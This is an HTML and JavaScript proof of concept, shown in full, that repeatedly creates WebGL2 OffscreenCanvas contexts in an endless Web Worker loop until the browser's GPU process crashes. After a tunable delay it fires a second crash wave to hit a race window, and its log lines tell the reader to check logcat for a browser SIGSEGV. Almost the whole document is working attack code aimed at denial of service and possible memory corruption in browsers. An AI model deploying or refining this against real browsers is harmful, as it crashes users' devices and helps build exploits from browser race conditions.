<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>GPU Dual-Crash Race (Robust Polling)</title>
</head>
<body>
  <h3>GPU Dual-Crash Race – Main-Thread Polling</h3>
  <p>
    <label>Delay after 1st crash (ms): <input id="delay" type="number" value="20" step="5" min="0" max="500"></label>
    <button id="start">Start Dual Crash</button>
    <span id="status">Ready</span>
  </p>
  <pre id="log"></pre>

  <script>
    (function() {
      const log = (msg) => {
        const el = document.getElementById('log');
        el.textContent += msg + '\n';
        el.scrollTop = el.scrollHeight;
        console.log(msg);
      };

      // Check if GPU process is alive by trying to create a tiny WebGL context
      function isGpuAlive() {
        try {
          const c = document.createElement('canvas');
          c.width = 1; c.height = 1;
          const gl = c.getContext('webgl2');
          return gl !== null;
        } catch(e) { return false; }
      }

      // Create a Web Worker that runs the crash loop FOREVER
      function createCrashWorker() {
        const code = `
          // Infinite crash loop – same primitives you confirmed work
          (function() {
            const attrs = [
              { powerPreference: 'high-performance' },
              { powerPreference: 'low-power' },
              { desynchronized: true },
              { preserveDrawingBuffer: true },
              { failIfMajorPerformanceCaveat: false },
              { xrCompatible: true }
            ];
            // Run forever until terminated by main thread
            while (true) {
              for (let w = 1; w <= 16384; w *= 2) {
                for (let h = 1; h <= 16384; h *= 2) {
                  for (const attr of attrs) {
                    try {
                      const canvas = new OffscreenCanvas(w, h);
                      const gl = canvas.getContext('webgl2', attr);
                      if (!gl) continue;
                      gl.clear(gl.COLOR_BUFFER_BIT);
                      gl.flush();
                      canvas.width = 0;
                      canvas.height = 0;
                    } catch(e) {}
                  }
                }
              }
            }
          })();
        `;
        const blob = new Blob([code], { type: 'application/javascript' });
        return new Worker(URL.createObjectURL(blob));
      }

      let running = false;
      document.getElementById('start').addEventListener('click', async () => {
        if (running) return;
        running = true;
        document.getElementById('status').textContent = 'Wave 1: Stressing GPU...';
        log('=== Wave 1: Starting infinite crash worker ===');

        const worker1 = createCrashWorker();

        // Poll every 200ms until GPU process is dead
        let crashDetected = false;
        for (let i = 0; i < 300; i++) { // max ~60 seconds
          await new Promise(r => setTimeout(r, 200));
          if (!isGpuAlive()) {
            crashDetected = true;
            break;
          }
        }

        if (!crashDetected) {
          log('[!] GPU did not crash within 60s. Aborting.');
          worker1.terminate();
          document.getElementById('status').textContent = 'Failed – GPU still alive';
          running = false;
          return;
        }

        // GPU is dead – terminate the first worker
        log('[Worker1] GPU crash detected (main thread).');
        worker1.terminate();
        const delay = parseInt(document.getElementById('delay').value) || 20;
        log('Waiting ' + delay + 'ms before second crash...');
        document.getElementById('status').textContent = 'Waiting for race window...';
        await new Promise(r => setTimeout(r, delay));

        if (!running) return;

        log('=== Wave 2: Firing second crash ===');
        document.getElementById('status').textContent = 'Wave 2: Stressing GPU...';
        const worker2 = createCrashWorker();

        // Let worker2 run for a while, then stop (or detect second crash)
        // We'll rely on logcat to see the second crash; worker2 keeps stress high.
        await new Promise(r => setTimeout(r, 10000)); // 10 seconds of stress
        worker2.terminate();
        log('=== Both waves completed. Check logcat for double-crash or browser SIGSEGV. ===');
        document.getElementById('status').textContent = 'Done – check logcat';
        running = false;
      });

      log('Ready. Press "Start Dual Crash". Tune delay if needed (start with 20ms).');
    })();
  </script>
</body>
</html>
